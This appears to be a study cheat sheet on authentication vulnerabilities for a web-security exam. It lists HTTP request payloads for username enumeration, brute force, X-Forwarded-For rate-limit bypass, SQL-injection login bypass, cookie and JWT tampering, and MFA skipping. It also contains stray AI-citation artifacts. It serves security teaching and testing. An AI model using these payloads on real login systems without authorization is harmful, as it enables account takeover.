

---

`md
> [!ABSTRACT]
> Authentication vulnerabilities occur when mechanisms used to **verify user identity** are weak or improperly implemented.  
> This allows attackers to **log in as other users or bypass login entirely**.  
> 
> It happens when:
> - Login logic is flawed  
> - Credentials can be guessed or enumerated  
> - Tokens/session handling is weak  
> 
> Common attacks:
> - Brute force  
> - Username enumeration  
> - Authentication bypass  
> - Weak session/token handling  
> 
> Impact:
> - Account takeover  
> - Access to sensitive data  
> - Full application compromise (if admin account)  
> 
> 🧠 Think: “If login is broken → everything is broken” :contentReference[oaicite:0]{index=0}

---

## 🧠 Authentication – Cheat Sheet

---

### 🎯 1. Basic Login Testing

> [!CHECK]
> Test login behavior with valid/invalid credentials  
> Look for response differences  

```http
POST /login
username=admin&password=wrong
````

```http
POST /login
username=invalid&password=wrong
```

---

### 🧪 2. Username Enumeration

> [!CHECK]  
> Detect valid usernames via response differences  
> Look for status/message/timing changes

```http
POST /login
username=carlos&password=test
```

```http
POST /login
username=invaliduser&password=test
```

---

### 🧬 3. Brute Force Attack

> [!SUCCESS]  
> Guess password using wordlists  
> Works if no proper rate limiting

```http
POST /login
username=carlos&password=123456
```

---

### 🧩 4. Bypass Rate Limiting

> [!ATTENTION]  
> Use header manipulation or logic flaws

```http
X-Forwarded-For: 127.0.0.1
```

```http
X-Forwarded-For: 192.168.1.1
```

---

### 💥 5. Broken Authentication Logic

> [!SUCCESS]  
> Exploit flawed login workflows

```http
POST /login
username=carlos&password=
```

```http
POST /login
username=admin'--
```

---

### ⚙️ 6. Password Reset Abuse

> [!ATTENTION]  
> Test password reset tokens and flows

```http
POST /forgot-password
username=carlos
```

```http
POST /reset-password
token=123456
```

---

### 🧪 7. Session / Cookie Testing

> [!SUCCESS]  
> Manipulate session tokens

```http
Cookie: session=abcdef123456
```

```http
Cookie: session=admin
```

---

### 💣 8. JWT / Token Tampering

> [!SUCCESS]  
> Modify token payload

```json
{
  "username": "admin"
}
```

---

### 🔍 9. Multi-Factor Bypass

> [!ATTENTION]  
> Skip or bypass MFA steps

```http
POST /login
username=carlos&password=correct
```

```http
GET /my-account
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Test login:
    

```http
POST /login
```

2. Enumerate users:
    

```http
username=carlos
```

3. Brute force:
    

```http
password=123456
```

4. Bypass protections:
    

```http
X-Forwarded-For: 127.0.0.1
```

5. Test session:
    

```http
Cookie: session=...
```

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- Login endpoints
    
- Password reset flows
    
- Registration endpoints
    
- API authentication
    
- Session cookies / JWT
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
POST /login username=carlos&password=123456
X-Forwarded-For: 127.0.0.1
Cookie: session=admin
username=admin'--
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Strong rate limiting
>     
> - Generic error messages
>     
> - MFA properly enforced
>     

---

> [!ATTENTION]  
> Authentication is **entry point to everything**
> 
> Always test:
> 
> - Login logic
>     
> - Reset flows
>     
> - Sessions
>     
> - Tokens
>     
> 
> One flaw = full account takeover

---

```

---

## 🔥 Why this one is critical

- Authentication bugs = **highest impact bugs**
- Almost always lead to:
  - Account takeover  
  - Privilege escalation  
- Shows up heavily in:
  - Bug bounty  
  - Real pentests  

---


::contentReference[oaicite:1]{index=1}
```